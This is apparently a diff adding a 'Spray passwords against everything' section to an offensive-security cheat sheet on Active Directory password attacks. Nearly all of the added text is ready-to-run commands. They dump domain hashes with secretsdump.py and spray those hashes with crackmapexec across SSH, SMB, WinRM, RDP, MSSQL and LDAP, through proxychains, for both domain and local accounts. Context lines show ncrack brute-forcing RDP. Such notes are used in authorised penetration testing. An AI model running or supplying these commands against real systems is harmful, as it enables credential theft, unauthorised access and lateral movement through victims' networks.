@@ -68,6 +68,30 @@ Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
   ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
   ```
 
+## Spray passwords against everything
+* Using [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)
+```
+> Take Administrator Password from mimikatz and secretsdump.py (Make sure you copy and save all the hash into hashes.txt)
+proxychains4 -q -f /etc/proxychains_9052.conf python secretsdump.py -hashes :077a55c458dc4002dfdc5321a7659526 EXAMPLE.COM/Administrator@sql01.example.com
+
+echo "" >> users.txt
+echo "Administrator" >> users.txt
+echo "Guest" >> users.txt
+echo "DefaultAccount" >> users.txt
+echo "WDAGUtilityAccount" >> users.txt
+proxychains4 -q ./cme ssh --continue-on-success -u users.txt -H hashes.txt -d example.com targets.txt | grep "\[+\]"
+proxychains4 -q ./cme smb --continue-on-success -u users.txt -H hashes.txt -d example.com targets.txt | grep "\[+\]"
+proxychains4 -q ./cme winrm --continue-on-success -u users.txt -H hashes.txt -d example.com targets.txt | grep "\[+\]"
+proxychains4 -q ./cme rdp --continue-on-success -u users.txt -H hashes.txt -d example.com targets.txt | grep "\[+\]"
+proxychains4 -q ./cme mssql --continue-on-success -u users.txt -H hashes.txt -d example.com targets.txt | grep "\[+\]"
+proxychains4 -q ./cme ldap --continue-on-success -u users.txt -H hashes.txt -d example.com targets.txt | grep "\[+\]"
+proxychains4 -q ./cme ssh --continue-on-success -u users.txt -H hashes.txt --local-auth targets.txt | grep "\[+\]"
+proxychains4 -q ./cme smb --continue-on-success -u users.txt -H hashes.txt --local-auth targets.txt | grep "\[+\]"
+proxychains4 -q ./cme winrm --continue-on-success -u users.txt -H hashes.txt --local-auth targets.txt | grep "\[+\]"
+proxychains4 -q ./cme rdp --continue-on-success -u users.txt -H hashes.txt --local-auth targets.txt | grep "\[+\]"
+proxychains4 -q ./cme mssql --continue-on-success -u users.txt -H hashes.txt --local-auth targets.txt | grep "\[+\]"
+proxychains4 -q ./cme ldap --continue-on-success -u users.txt -H hashes.txt --local-auth targets.txt | grep "\[+\]"
+```
 
 ## BadPwdCount attribute
 
